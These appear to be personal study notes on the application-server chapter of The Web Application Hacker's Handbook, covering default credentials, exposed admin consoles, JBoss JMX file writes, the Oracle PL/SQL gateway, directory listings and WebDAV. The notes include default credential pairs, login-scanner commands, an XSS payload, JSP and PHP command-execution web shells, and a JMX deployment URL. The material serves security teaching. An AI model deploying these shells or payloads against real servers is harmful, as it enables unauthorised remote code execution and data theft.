**Note:** This is the thirteenth installment of my notes and reflections from The Web Application Hacker's Handbook. These reminders are neither exhaustive nor definitive—they're simply a personal tool to help me absorb, understand, and organize new material in a way that works for me.

# Attacking the Application Server:

Web applications do not operate in isolation. Every application depends on an underlying technology stack composed of web servers, application servers, operating systems, frameworks, APIs, and network infrastructure. Any weakness within these supporting layers may provide an attacker with a path toward fully compromising the application itself.

Many attacks against lower-level infrastructure fall outside the scope of traditional web application testing. However, the boundary between a web application and the platform hosting it is often blurry. Modern applications rely heavily on application servers and middleware components to manage routing, session handling, authentication, communication with back-end systems, and security controls. As a result, vulnerabilities affecting these layers can directly impact the security of the application running on top of them.

Throughout many attacks, there is little practical distinction between a *web server* and an *application server* because both participate in delivering the application to the user. Nevertheless, understanding the difference is important. A traditional web server primarily handles tasks such as:

- Processing HTTP/S requests

- Serving static content

- Managing TLS connections

- Reverse proxying traffic

- Load balancing

Examples include:

- Apache HTTP Server

- Nginx

- Microsoft IIS

An application server typically provides the runtime environment in which the web application executes. This may include:

- Session management

- Authentication frameworks

- API handling

- Database connectivity

- Application logic execution

- Integration with external services

Examples include:

- Apache Tomcat

- WildFly

- Node.js

In many modern deployments, these roles overlap significantly. For example, a reverse proxy such as Nginx may sit in front of an application container running Node.js, PHP-FPM, or Tomcat. An attacker often does not initially care where the vulnerability resides — only that the vulnerable component can be influenced through HTTP requests. Application servers frequently expose a large attack surface because they:

- Parse complex input formats

- Load third-party modules and extensions

- Interface with databases and internal services

- Manage authentication and sessions

- Execute dynamically generated code

- Communicate with operating system resources

Any weakness within these mechanisms may allow attackers to:

- Access sensitive files

- Execute arbitrary commands

- Bypass authentication

- Escalate privileges

- Pivot deeper into internal infrastructure

- Compromise the entire application environment

A vulnerability affecting the application server may ultimately be just as devastating as a flaw within the application code itself. Vulnerabilities affecting application servers generally fall into two broad categories:

**1. Misconfiguration and Weak Deployment Practices:**

Many successful compromises occur not because of sophisticated software flaws, but because systems are deployed insecurely. Common examples include:

- Default credentials

- Directory listing enabled

- Exposed administrative interfaces

- Dangerous HTTP methods enabled

- Debug functionality left accessible

- Verbose error messages

- Insecure permissions

- Unpatched software versions

Misconfigurations are especially dangerous because they are often easy to overlook during deployment and may remain exposed for years.

**2. Vulnerabilities Within Server Software:**

Application servers themselves may contain security flaws introduced by developers of the platform or its extensions. Examples include:

- Buffer overflows

- Deserialization vulnerabilities

- Authentication bypasses

- Path traversal flaws

- Remote code execution vulnerabilities

- Insecure native modules

- Unsafe APIs and plugins

Historically, many severe compromises have resulted from flaws in middleware components rather than flaws in the application code directly. Modern applications rarely remain confined within a single isolated environment. They commonly interact with:

- Databases

- File systems

- Cloud APIs

- Internal microservices

- Authentication providers

- Caching systems

- Message queues

Whenever an application server "reaches outside" its container, the attack surface expands significantly. Trust boundaries become more complicated, and mistakes in validation or access control can expose sensitive internal functionality. Attackers frequently attempt to abuse these interactions to move laterally through infrastructure. This chapter also introduces web application firewalls (WAFs), which are designed to detect and block malicious traffic before it reaches the application. Popular examples include:

- ModSecurity

- Cloudflare WAF

- Imperva WAF

WAFs can provide valuable protection against:

- SQL injection

- Cross-site scripting (XSS)

- Malicious payloads

- Automated attacks

- Protocol anomalies

However, WAFs are not magical shields. They operate by inspecting traffic patterns and applying filtering rules, which means they can often be bypassed through:

- Encoding tricks

- Obfuscation

- Alternate syntax

- Parser discrepancies

- Request fragmentation

- Logical abuse of application functionality

A recurring theme in offensive security is that defensive systems frequently interpret input differently from the application they are trying to protect. Much of WAF evasion revolves around exploiting these inconsistencies.

## Vulnerable Server Configuration:

Even relatively simple web servers expose a surprisingly large number of configuration options that control how the server behaves, authenticates users, handles requests, and exposes administrative functionality. Historically, many platforms shipped with insecure defaults enabled out of the box. If administrators fail to harden these settings during deployment, attackers may discover easy paths into the application environment without exploiting any sophisticated vulnerability at all. In many real-world intrusions, weak configuration becomes the initial foothold.

### Default Credentials:

Many web servers, application servers, network appliances, and management tools expose administrative interfaces through a web browser. These interfaces may:

- Exist within the main web root

- Operate on alternative ports such as ```8080```, ```8443```, or ```9090```

- Be accessible only internally but accidentally exposed to the Internet

- Use factory-default credentials that administrators forget to change

Common targets include:

- Routers

- Switches

- Wireless access points

- NAS devices

- Printers

- Hypervisors

- Monitoring dashboards

- Application management panels

Examples of historically exposed administrative panels include:

- Apache Tomcat Manager

- phpMyAdmin

- Jenkins

- Webmin

Default credentials are dangerous because they are:

- Publicly documented

- Frequently reused

- Often unchanged after installation

- Commonly indexed in password databases and cheat sheets

Some infamous defaults include combinations such as:

```
admin:admin
admin:password
root:root
tomcat:tomcat
```

While these examples may seem absurdly weak, they still appear regularly during real assessments.

Administrative interfaces frequently provide functionality capable of completely compromising the host system. Depending on the platform, an attacker who gains access may be able to:

- Upload files

- Deploy applications

- Execute commands

- Modify server configuration

- Access logs and credentials

- Restart services

- Create new administrative users

- Browse sensitive files

For example, the Tomcat Manager interface historically allowed authenticated users to deploy WAR files directly to the server. If administrative credentials were compromised, attackers could simply upload a malicious application and achieve remote code execution. In other words, default credentials can transform a hardened target into a one-click compromise.

**Attack Methodology:**

*1. Identify the Underlying Technologies:*

Review all information gathered during application mapping and reconnaissance to identify technologies used by the target. Useful clues include:

- HTTP response headers

- Error messages

- Page titles

- Cookies

- Login portals

- Exposed directories

- TLS certificate metadata

Administrative panels often reveal themselves through locations such as:

```
/admin
/manager
/console
/phpmyadmin
/server-status
```

Alternative ports are also extremely common.

*2. Perform Port Scanning:*

Administrative interfaces frequently operate on ports separate from the primary web application. Common examples include:

```
8080
8443
8009
8888
9090
10000
```

A basic Nmap scan may reveal hidden services. Example:

```
nmap -sV -Pn 192.168.1.15
```

Useful flags:

- ```-sV``` → Detect service versions

- ```-Pn``` → Skip host discovery

- ```-p-``` → Scan all TCP ports

- ```-A``` → Aggressive enumeration

More thorough enumeration:

```
nmap -sV -sC -O -p- TARGET-IP
```

This may expose forgotten dashboards or management services that administrators assumed were inaccessible.

*3. Research Default Credentials:*

Once an administrative interface has been identified, research common default credentials associated with that product. Useful resources include:

- Vendor documentation

- Public password databases

- Security cheat sheets

- Exploit writeups

- Penetration testing frameworks

One well-known resource is: [SecLists Default Credentials Collection](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)

Another classic source is: [CIRT Default Password Database](https://cirt.net/passwords/)

*Metasploit and Default Credential Databases?*

The book is referring to auxiliary modules and credential collections integrated into the framework rather than a single centralized “default password database.” Within Metasploit Framework, default credential attacks are commonly performed using auxiliary scanner modules such as:

```
auxiliary/scanner/http/tomcat_mgr_login
auxiliary/scanner/http/jenkins_login
auxiliary/scanner/http/http_login
auxiliary/scanner/mysql/mysql_login
```

These modules often contain:

- Built-in default credential lists

- Common username/password combinations

- Brute-force capabilities

- Credential spraying functionality

You can explore them inside Metasploit using:

```
search login
search tomcat
search scanner
```

To inspect a specific module:

```
info auxiliary/scanner/http/tomcat_mgr_login
```

Some modules also reference external wordlists located within the Metasploit installation directory. Common paths include:

```
/usr/share/metasploit-framework/data/wordlists/
```

or on some systems:

```
/opt/metasploit-framework/embedded/framework/data/wordlists/
```

These directories contain:

- Default usernames

- Password lists

- Common credential pairs

- Service-specific dictionaries

*4. Attempt Credential Guessing:*

If known defaults fail, attempt controlled credential attacks using previously discussed techniques such as:

- Password guessing

- Username enumeration

- Credential stuffing

- Brute force attacks

- Password spraying

Attackers frequently leverage:

- Organization naming conventions

- Weak password policies

- Reused credentials

- Seasonal passwords

- Vendor defaults combined with custom usernames

Even when default passwords have been changed, administrators often choose predictable replacements.

*5. Post-Authentication Enumeration:*

If access is obtained, carefully review all available functionality within the administrative interface. Key areas of interest include:

- File upload functionality

- Deployment mechanisms

- Script execution features

- Backup downloads

- Log access

- Database configuration

- Stored credentials

- System information pages

Administrative panels frequently expose enough functionality to achieve:

- Remote code execution

- Privilege escalation

- Credential harvesting

- Lateral movement

- Full server compromise

At this stage, the administrative interface effectively becomes a bridge between the web application and the underlying operating system.

### Default Content:

Most application servers ship with a variety of default files, scripts, utilities, and demonstration functionality intended to help administrators configure and test the server environment. In secure deployments, this content should either be removed or properly restricted before the server is exposed to users. Unfortunately, default content is often forgotten during deployment and may remain publicly accessible for years.

From an attacker's perspective, these components can be extremely valuable because they may expose:

- Debugging functionality

- Sample applications

- Administrative utilities

- Diagnostic endpoints

- Internal documentation

- Sensitive configuration details

- Unsafe demonstration code

In many cases, these components were never intended to be reachable from the public Internet.

#### Common Types of Dangerous Default Content — Debug and Diagnostic Functionality:

Servers often include tools designed to help administrators troubleshoot problems and inspect the runtime environment. These pages may reveal:

- File system paths

- Installed modules

- Environment variables

- Application versions

- Database configuration

- Session details

- Loaded extensions

- Internal IP addresses

Even when no direct exploit exists, this information can dramatically improve an attacker's understanding of the target environment. One classic example is the ```phpinfo()``` diagnostic page commonly found on poorly hardened PHP installations. This page simply executes:

```
<?php
phpinfo();
?>
```

The output may reveal:

- PHP version

- Loaded modules

- Server paths

- Temporary directories

- Environment variables

- Authentication settings

- Database extensions

- Cookie settings

Historically, exposed ```phpinfo()``` pages have helped attackers:

- Identify vulnerable PHP versions

- Discover Local File Inclusion (LFI) paths

- Locate upload directories

- Fingerprint installed software

- Leak secrets accidentally exposed through environment variables

A harmless-looking debug page can therefore become a reconnaissance goldmine.

Many application servers also ship with demonstration applications intended to teach developers how to use server APIs and features. In theory, these examples should be safe and minimal. In practice, sample applications have historically introduced numerous vulnerabilities for two major reasons:

*1. Vulnerable Demonstration Code:*

Some sample applications contain genuine security flaws that attackers can directly exploit. Historically, developers often treated demo code as educational rather than security-critical, which resulted in poor input validation and unsafe practices.

*2. Dangerous Functionality Exposed by Design:*

Other examples intentionally expose powerful server functionality for demonstration purposes. Even when technically “working as intended,” these applications may still provide capabilities that are extremely useful to attackers.

**Historical Example: Jetty Dump Servlet!**

An interesting historical example involved the Dump Servlet shipped with older versions of *Eclipse Jetty.* Older Jetty demo environments exposed endpoints similar to:

```
/test/jsp/dump.jsp
```

The page displayed detailed information about:

- HTTP requests

- Query parameters

- Headers

- Session information

- Server environment details

The original book references a reflected XSS issue caused by unsafely rendering user-controlled input from the query string. Example payload:

```
/test/jsp/dump.jsp?<script>alert("xss")</script>
```

URL-encoded version:

```
/test/jsp/dump.jsp?%3Cscript%3Ealert(%22xss%22)%3C/script%3E
```

*Modern-Day Context and Clarification:*

Additional note here is important because modern environments changed somewhat compared to the era in which the book was written. Today:

- Modern frameworks usually implement better default output encoding

- Browsers enforce stronger protections

- Demo applications are less commonly exposed directly

- Containers and cloud deployments often reduce default content exposure

However, the *core lesson remains extremely relevant.* Modern equivalents still appear constantly in the form of:

- Debug APIs

- Swagger/OpenAPI test consoles (Swagger UI is a test console that allows users to visualize and interact with APIs defined by the OpenAPI Specification, enabling easy testing and exploration of API endpoints. It automatically generates documentation from the API definition, making it user-friendly for developers and testers.)

- GraphQL playgrounds (GraphQL Playground is an integrated development environment (IDE) for exploring and testing GraphQL APIs, offering features like interactive querying, syntax highlighting, and documentation access. It allows developers to write and execute queries, visualize responses, and manage query history efficiently.)

- Development dashboards

- Spring Boot actuator endpoints (Spring Boot Actuator provides a set of built-in endpoints that allow you to monitor and manage your application, including health checks, metrics, and environment properties. Key endpoints include ```/actuator/health``` for application health information and ```/actuator/metrics``` for application metrics.)

- Kubernetes dashboards (Kubernetes Dashboard is a web-based user interface for managing and monitoring Kubernetes clusters. It allows users to perform basic administrative tasks, view cluster events, and manage applications running within the cluster.)

- CI/CD panels (CI/CD panels refer to discussions or presentations that focus on Continuous Integration and Continuous Delivery practices, often featuring experts who share insights on emerging technologies and best practices in software delivery. These panels explore topics like automation, AI integration, and the challenges faced in implementing CI/CD pipelines.)

- Verbose error handlers

Even when a direct XSS is no longer possible, these endpoints often leak valuable information or expose dangerous functionality. The modern offensive mindset is therefore: *“if a debug endpoint exists, assume it was not designed with hostile Internet traffic in mind.”* That assumption turns out to be correct disturbingly often.

**Example #2: Tomcat Session Manipulation!**

Another historically interesting example involved the Sessions Example application shipped with Apache Tomcat. This demo application allowed users to:

- Create session variables

- Modify session variables

- View stored session data

At first glance, this sounds harmless. However, many web applications store sensitive information inside user sessions, including:

- Authentication state

- User IDs

- Roles and permissions

- Workflow state

- Temporary tokens

If a demonstration application exposes the same session context used by the main application, attackers may gain the ability to:

- View sensitive data

- Manipulate application state

- Bypass security checks

- Interfere with business logic

This demonstrates an important principle in web security: *features intended for convenience or debugging often become dangerous when deployed into real production environments.*

Overall, default content is especially dangerous because it tends to be:

- Trusted by administrators

- Overlooked during audits

- Rarely monitored

- Poorly documented

- Forgotten after installation

Attackers actively search for these resources because they frequently provide:

- Easy reconnaissance

- Version disclosure

- Authentication bypass opportunities

- Remote code execution paths

- Sensitive information leakage

Sometimes the most valuable attack surface is not the application itself, but the forgotten pile of “temporary” utilities quietly rotting beside it like abandoned machinery in a flooded basement corridor.

### Powerful Functions Exposed by Default:

In addition to debug pages and sample applications, many application servers historically exposed powerful administrative functionality that was never intended for public access. Unlike a simple information disclosure vulnerability, these features often provide direct control over the application server itself. Examples include:

- Application deployment interfaces

- Administrative consoles

- Management APIs

- Monitoring endpoints

- Configuration interfaces

- Remote management services

Like stated before, if an attacker gains access to these features, they may be able to deploy applications, upload files, modify server configuration, execute commands, create users, access sensitive data and completely compromise the underlying server. As a result, administrative functionality is often a far more valuable target than the application itself.

#### WAR File Deployment as an Attack Vector:

Many Java application servers support deployment of applications packaged as **WAR files** *(Web Application Archives).* A WAR file is essentially a ZIP archive containing:

```
Application code
JSP pages
Java classes
Configuration files
Libraries
Static content
```

Administrators normally use WAR files to deploy legitimate applications. However, if an attacker gains access to an administrative deployment interface, they can often upload their own malicious WAR file containing a backdoor. A typical attack chain looks like this:

```
Administrative Interface
          ↓
Credential Compromise
          ↓
WAR File Upload
          ↓
Application Deployment
          ↓
Remote Code Execution
```

Historically, many penetration tests against Java environments ended exactly this way. Earlier we discussed Metasploit modules such as:

```
auxiliary/scanner/http/tomcat_mgr_login
auxiliary/scanner/http/jenkins_login
auxiliary/scanner/http/http_login
auxiliary/scanner/mysql/mysql_login
```

These modules help identify weak or default credentials. Once valid credentials are discovered, other modules may automate the next stage by:

- Uploading a WAR file

- Deploying the application

- Triggering the payload

- Opening a remote shell

Historically, this workflow was extremely common against misconfigured Java application servers.

##### JBoss and the JMX Console:

The book now introduces a technology that was infamous during the late 2000s and early 2010s. *JBoss Application Server* was a popular open-source Java application server. Today it has largely evolved into and been replaced by WildFly, although older JBoss installations can still be found in legacy environments. Like Tomcat, JBoss was responsible for:

- Running Java web applications

- Managing sessions

- Handling deployments

- Providing administrative services

*JMX* stands for *Java Management Extensions.* Think of it as a management framework built into Java applications. Administrators can use JMX to:

- Monitor services

- View runtime information

- Change configuration

- Deploy applications

- Control server components

Internally, JMX exposes manageable objects known as **MBeans** *(Managed Beans).* An MBean is simply a Java object whose methods can be invoked through the management interface. The problem? Early JBoss versions exposed extremely powerful MBeans through web-accessible interfaces. One particularly dangerous component was:

```
/jmx-console/
```

This interface provided direct access to internal JBoss management functionality. Among the available MBeans was:

```
jboss.admin:service=DeploymentFileRepository
```

This component exposed a method named:

```
store()
```

The purpose of ```store()``` was to write deployment files to disk. Unfortunately, attackers discovered they could abuse it to create arbitrary files on the server.

**Example Attack:**

A cleaned-up URL version looks conceptually like this:

```
http://target:8080/jmx-console/HtmlAdaptor?
action=invokeOpByName&
name=jboss.admin:service=DeploymentFileRepository&
methodName=store
```

Additional parameters supplied:

```
Application name
File name
File extension
File content
Deployment flag
```

The attacker effectively tells JBoss:

```
Create a WAR application
Create a JSP file inside it
Write my supplied content
Deploy it automatically
```

From a security perspective, this is essentially:

```
Arbitrary File Write
        +
Automatic Deployment
        =
Remote Code Execution
```

Which is about as bad as things can get.

**The Backdoor JSP:**

The payload shown in the book is:

```
<%
Runtime.getRuntime().exec(
    request.getParameter("c")
);
%>
```

Let's examine it line by line:

```
Runtime.getRuntime()
```

Obtains the Java runtime environment.

```
.exec(...)
```

Executes an operating-system command.

```
request.getParameter("c")
```

Reads the value of the HTTP parameter named ```c```.

Combined together:

```
Runtime.getRuntime().exec(
    request.getParameter("c")
);
```

Means: *"take whatever command the user supplied and execute it on the operating system."* This is essentially a tiny web shell.

The attack becomes especially powerful because JBoss included a Deployment Scanner. After the file is written:

```
cmdshell.war
```

the Deployment Scanner automatically notices the new application and deploys it. No administrator interaction is required. The attacker uploads the application and JBoss immediately makes it available.

**Accessing the Shell:**

The intended request was conceptually similar to:

```
http://target:8080/cmdshell/cmdshell.jsp?c=ipconfig
```

or on Linux:

```
http://target:8080/cmdshell/cmdshell.jsp?c=id
```

The JSP page receives the parameter:

```
c=ipconfig
```

and executes it on the server. For example:

```
http://target:8080/cmdshell/cmdshell.jsp?c=whoami
```

would attempt to execute:

```
whoami
```

on the operating system.

At a high level, the attack is surprisingly simple:

```
cmdshell.war
│
└── cmdshell.jsp
```

And that ```cmdshell.jsp``` is conceptually very similar to a minimal PHP web shell. PHP version:

```
<?php
system($_GET['cmd']);
?>
```

JSP version:

```
<%
Runtime.getRuntime().exec(
    request.getParameter("c")
);
%>
```

In both cases, the application:

1. Receives a parameter from the HTTP request.

2. Passes that parameter to the operating system.

3. Returns (or triggers) command execution.

The reason for the WAR file is that Java application servers like Apache Tomcat and JBoss Application Server don't normally execute loose JSP files dropped randomly onto disk. They expect applications to be deployed as web applications, typically packaged inside a WAR archive. So the attacker's thought process is basically:

```
I can write files through JMX
        ↓
JBoss wants WAR files
        ↓
I'll create a WAR containing a JSP shell
        ↓
JBoss automatically deploys it
        ↓
I now have remote code execution
```

The funny thing is that the "application" may be almost empty:

```
cmdshell.war
│
├── WEB-INF/
│   └── web.xml
│
└── cmdshell.jsp
```

Just enough structure for JBoss to recognize it as a deployable web application. From a modern perspective, this is one of those attacks that feels almost comically direct: *"You gave me an administrative function that can write deployment files. I deployed an application. My application just happens to be a shell."*

**The Failed Fix:**

The book mentions a fascinating historical mistake. Developers attempted to secure the JMX console by restricting:

```
GET
POST
```

requests. Unfortunately, they forgot about:

```
HEAD
```

requests. Because the application processed HEAD requests similarly, attackers could simply switch HTTP methods and bypass the protection. This is a classic example of securing individual inputs rather than securing the underlying functionality. The dangerous operation remained accessible, so attackers simply found another route to reach it.

**Modern-Day Relevance?**

You are unlikely to encounter this exact JBoss/JMX exploit chain on modern infrastructure. However, the underlying lesson remains extremely important. As stated before, modern equivalents include the usual assortment of:

- Management APIs

- Kubernetes dashboards

- Cloud administration endpoints

- CI/CD deployment interfaces

- Spring Boot actuator endpoints

- Internal monitoring consoles

- Application deployment services

The technology changes. The mistake remains the same: *exposing administrative functionality to untrusted users creates an attack surface that is often far more dangerous than the application itself.*

#### Oracle Applications & the PL/SQL Gateway:

The Oracle PL/SQL Gateway is a mechanism that allows web requests to be translated into calls to backend database procedures. In systems such as Oracle Application Server and Oracle E-Business Suite, this gateway exposes database functionality over HTTP. The basic idea is:

```
HTTP Request → PL/SQL Gateway → Oracle Database Procedure → Response
```

A typical URL format looks like:

```
https://target/pls/dad/package.procedure?param1=foo&param2=bar
```

Here:

- ```package.procedure``` = a stored procedure inside the database

- ```param1```, ```param2``` = arguments passed directly into that procedure

So instead of calling SQL locally, the web layer becomes a thin wrapper over database logic. That design is powerful (and dangerous). The core issue is simple: *the web layer allows arbitrary database procedures to be invoked via HTTP.* If an attacker can control which procedure is called (or influence its parameters), they may be able to:

- Run database queries

- Access sensitive tables

- Modify data

- Abuse administrative packages

- Trigger internal functionality not meant for web users

This effectively turns the database into a remote web-accessible API.

**The ```OWA_UTIL.CELLSPRINT``` Example:**

The book shows an example like:

```
https://target/pls/dad/SYS.OWA_UTIL.CELLSPRINT?
P_THEQUERY=SELECT+*+FROM+users
```

Let’s clean that up and explain it a bit better! So, what is happening here?

- ```SYS.OWA_UTIL``` is an internal Oracle utility package

- ```CELLSPRINT``` is a procedure inside it

- ```P_THEQUERY``` is a parameter that accepts a SQL query string

So the attacker is effectively doing:

```
SELECT * FROM users;
```

…but instead of running it inside a database console, they are injecting it through a web-accessible endpoint. The gateway then:

1. Receives the HTTP request

2. Extracts ```P_THEQUERY```

3. Executes it inside the database context

4. Returns the result as a web page

So the request becomes a ***remote SQL execution interface disguised as a URL parameter system.*** In modern Oracle environments, this exact pattern is less commonly exposed directly to the internet, but the concept still exists in different forms:

- REST-enabled database services

- APEX applications (Apex applications refer to software developed using Oracle APEX, a low-code application development platform that allows users to create web-based applications quickly and efficiently. These applications can be used for various purposes, including enterprise resource planning, customer relationship management, and more, leveraging the capabilities of the Oracle Database.)

- Legacy E-Business Suite installations

- Misconfigured PL/SQL gateways behind reverse proxies

The core risk remains: *if HTTP can directly invoke database logic, the database becomes part of the attack surface.* Modern systems try to mitigate this by:

- Restricting exposed packages

- Using allowlists of callable procedures

- Separating application logic from database internals

- Moving toward REST APIs with controlled endpoints

But legacy Oracle deployments are still very much alive in enterprise environments.

**The PL/SQL Exclusion List:**

Oracle introduced the *PL/SQL Exclusion List* as a defensive measure. It blocks access to sensitive package prefixes like:

```
SYS.
DBMS_
UTL_
OWA_
HTP.
HTF.
```

- File system access

- Network access

- HTTP generation

- Database administration functions

So the filter tries to enforce: *“You may call database procedures, but not the powerful internal ones.”*

**Why the Filter Failed?**

The exclusion list had a fundamental weakness: it was ***pattern-based, not capability-based.*** So while it blocked obvious dangerous namespaces, it failed to account for:

- Other privileged schemas (e.g., ```CTXSYS```, ```MDSYS```)

- Less obvious administrative packages

- Custom-installed components with high privileges

- Edge cases where dangerous functionality lived outside blocked prefixes

So attackers didn’t need to break the filter. They just walked around it.

**The E-Business Suite XSS Case:**

In Oracle E-Business Suite, some procedures like:

```
icx_define_pages.DispPageDialog
```

allowed administrative page configuration. A simplified version of the idea in the book is:

```
/pls/dad/icx_define_pages.DispPageDialog?p_mode=RENAME&p_page_id=123
```

- ```icx_define_pages``` = internal admin module

- ```DispPageDialog``` = function that renders an admin page dialog

- ```p_page_id``` = identifies a page being modified

If input validation is weak, an attacker can inject HTML or script content into page definitions. That leads to:

- Stored XSS in admin dashboards

- Persistent manipulation of UI content

- Potential session theft or admin impersonation

Today, this kind of vulnerability shows up less as raw PL/SQL injection and more as:

- Admin panels in enterprise apps

- CMS plugin injection points

- Misconfigured API gateways

- Server-side template injection in backend systems

- Legacy ERP systems exposed through reverse proxies

The shape of the problem remains identical: *“a trusted backend system is reachable through a web interface without strict control over what can be executed.”*

**Hack Steps:**

Our book’s methodology still holds, but today it maps more like this:

- Use scanners (Nikto-style tools) to find legacy endpoints

- Enumerate known application server and database gateway paths

- Research vendor-specific default modules and endpoints

- Set up local instances of enterprise software to study behavior safely

- Identify any HTTP-accessible interface that maps directly to backend execution logic

But the deeper mindset is: *always ask whether a URL is* ***calling a function*** *or merely requesting data.* Because once it becomes function-calling, you’re no longer just “browsing a web app” — you’re talking directly to the brain of the system.

#### Directory Listings:

When a web server receives a request for a directory rather than a specific file, several outcomes are possible. For example, suppose a user requests:

```
https://target.com/images/
```

instead of:

```
https://target.com/images/logo.png
```

The server will typically respond in one of three ways:

**1. Serve a Default Document:**

Many web servers automatically return a default file such as:

```
index.html
index.php
default.aspx
```

The user sees the default page rather than the directory contents.

**2. Return an Access Error:**

The server may deny access entirely:

```
HTTP/1.1 403 Forbidden
```

This is often the preferred behavior when directory browsing is not intended.

**3. Return a Directory Listing:**

The server may generate an index showing all files and folders within the directory. Example:

```
/images/
├── logo.png
├── banner.jpg
├── archive/
└── old/
```

This feature is commonly known as *directory browsing* or *directory indexing.* On the surface, directory listings often seem harmless. Finding:

```
/images/logo.png
/images/background.jpg
```

may reveal nothing sensitive. However, attackers value directory listings because they frequently expose resources that were never intended to be discovered. Two common scenarios are particularly important.

**1. Hidden Functionality:**

Some applications rely on obscurity rather than proper authorization. Developers sometimes assume: *"nobody will guess this URL."* Examples:

```
/admin/
/backup/
/reports/
/oldapp/
/private/
```

If directory indexing is enabled, those locations become immediately visible. The vulnerability is not the directory listing itself. The real vulnerability is the missing access control. The directory listing simply removes the guesswork.

**2. Forgotten Files:**

This is where directory listings become especially valuable. During development, administrators frequently leave behind:

```
backup.zip
database.sql
old.php
test.aspx
debug.log
notes.txt
config.old
```

These files may contain credentials, API keys, source code, database dumps, internal documentation or historical vulnerabilities. Many severe compromises begin with a forgotten backup file sitting quietly in a browsable directory. During application mapping, every discovered directory should be tested directly. For example:

```
/admin/
/backup/
/images/
/uploads/
/private/
```

Instead of requesting a specific file, request the directory itself. Example:

```
GET /backup/ HTTP/1.1
Host: target.com
```

If the server returns an index page, review every visible file and folder.

#### WebDAV:

The next topic introduces ***WebDAV*** *(Web Distributed Authoring and Versioning).* WebDAV extends HTTP by adding methods designed for remote file management. Think of WebDAV as:

```
HTTP
+
File Management Features
=
WebDAV
```

Its purpose is to allow users to manage files remotely using HTTP. Historically this was useful for:

- Collaborative editing

- Document sharing

- Remote storage

- Enterprise file management

Today similar concepts are still used in:

- SharePoint environments

- Cloud storage systems

- Enterprise collaboration platforms

**Common WebDAV Methods:**

***PUT:***

Uploads a new file or replaces an existing one. Example:

```
PUT /files/report.txt HTTP/1.1
```

Think: *"create or overwrite this file."*

***DELETE:***

Removes a file or resource. Example:

```
DELETE /files/report.txt HTTP/1.1
```

Think: *"delete this object."*

***COPY:***

Creates a duplicate of an existing file. Example:

```
COPY /report.txt HTTP/1.1
Destination: /backup/report.txt
```

Think: *"make a copy over there."*

***MOVE:***

Relocates or renames a file. Example:

```
MOVE /report.txt HTTP/1.1
Destination: /archive/report.txt
```

Think: *"move this file elsewhere."*

***SEARCH:***

Searches for resources matching specified criteria. Think: *"find files matching this query."*

***PROPFIND:***

Retrieves metadata about files and directories. Examples:

- Size

- Creation time

- Last modified time

- Author

- Content type

Think: *"tell me about this file."*

**Using OPTIONS:**

The HTTP ```OPTIONS``` method asks a server which HTTP methods it supports. Example:

```
OPTIONS /public/ HTTP/1.1
Host: target.com
```

The response may contain:

```
Allow: GET, POST, OPTIONS, PUT, DELETE
```

or:

```
DAV: 1,2
```

which indicates WebDAV support.

**Understanding the Response Headers:**

The book's example is a bit unreadable. Let's clean up the interesting parts.

***DAV: 1,2:***

```
DAV: 1,2
```

Indicates that WebDAV functionality is enabled.

***Public:***

```
Public: OPTIONS, GET, PUT, DELETE, COPY, MOVE
```

Lists methods the server publicly advertises.

***Allow:***

```
Allow: OPTIONS, GET, HEAD, PROPFIND
```

Lists methods allowed for the requested resource.

***DASL:***

```
DASL: <DAV:sql>
```

Indicates support for WebDAV search functionality.

***MS-Author-Via:***

```
MS-Author-Via: DAV
```

Historically suggested compatibility with Microsoft authoring tools such as FrontPage.

**Why PUT Is Dangerous?**

The ```PUT``` method is particularly interesting because it may allow users to upload files. A simplified test looks like:

```
PUT /public/test.txt HTTP/1.1
Host: target.com
Content-Length: 4

test
```

Successful response:

```
HTTP/1.1 201 Created
```

This means *the server accepted the upload and created the file.* From a security perspective, the first question becomes: *"what kinds of files can I upload?"*

**Modern-Day Testing:**

The tooling landscape has changed considerably. Historically people often used:

```
davtest
cadaver
litmus
```

These tools still exist and are occasionally useful. Modern testers often rely on:

- Burp Suite Repeater

- Burp Intruder

- Nmap NSE scripts

- Custom curl requests

- Manual testing

Examples:

```
curl -X OPTIONS https://target.com/

curl -X PROPFIND https://target.com/

curl -T test.txt https://target.com/uploads/
```

Nmap also includes useful scripts:

```
nmap --script http-webdav-scan target.com
```

These approaches are often sufficient for discovering misconfigured WebDAV services. The DAVTest output shown in the book looks like complete soup because the formatting was destroyed. The important takeaway is not the exact filenames. The workflow is:

**1. Upload multiple file types:**

```
test.php
test.jsp
test.aspx
test.txt
test.html
```

**2. Determine which uploads succeed:**

Example:

```
PHP      Upload Success
JSP      Upload Success
ASPX     Upload Blocked
TXT      Upload Success
```

**3. Attempt to execute uploaded files:**

Example:

```
test.jsp → Executes
test.php → Executes
test.txt → Downloads only
```

**4. If direct upload is blocked:**

```
Upload test.txt
↓
Rename using MOVE
↓
test.jsp
```

Some historical servers validated only the initial upload filename. After renaming, executable content became accessible. Overall, finding a publicly writable WebDAV server today is much less common than it was when WAHH was written. However, the underlying lesson remains highly relevant: *any file-management functionality exposed over HTTP deserves scrutiny.* Whether it is:

- WebDAV

- Cloud storage APIs

- SharePoint

- S3-compatible storage

- File upload portals

- CI/CD artifact repositories

the questions remain the same:

- Can files be uploaded?

- Can files be modified?

- Can files be moved or renamed?

- Can uploaded content be executed?

- Can uploaded content affect other users?

Those questions have remained surprisingly unchanged even as the underlying technologies have evolved.

#### The Application Server as a Proxy:

This section is actually very interesting because it represents one of the earliest forms of what modern security people would recognize as *server-side request abuse, SSRF,* and *pivoting through trusted infrastructure.*

Web servers are not always limited to serving web pages. In some environments, they are also configured to forward requests on behalf of users, acting as an HTTP proxy. When this functionality is exposed incorrectly, attackers may be able to abuse the server to make network connections that would otherwise be impossible. The resulting impact can be significant because the server often occupies a far more trusted position within the network than the attacker does.

Before continuing, it is useful to distinguish between two common proxy types.

**Forward Proxy:**

A forward proxy acts on behalf of the client.

```
Attacker
    ↓
Forward Proxy
    ↓
Target Website
```

The proxy retrieves content from external systems and returns it to the client. Examples include corporate web proxies, content filtering gateways or anonymous browsing proxies.

**Reverse Proxy:**

A reverse proxy acts on behalf of a server.

```
User
   ↓
Reverse Proxy
   ↓
Application Server
```

Examples include load balancers, CDN services or web application gateways. Most security issues discussed here involve *forward-proxy behavior* being exposed unintentionally. The danger comes from the fact that the proxy performs network requests from its own trusted location. The attacker effectively borrows the network position of the server.

**1. Attacking External Systems:**

A vulnerable proxy may allow an attacker to send requests to arbitrary systems on the Internet. Conceptually:

```
Attacker
    ↓
Proxy Server
    ↓
Victim Website
```

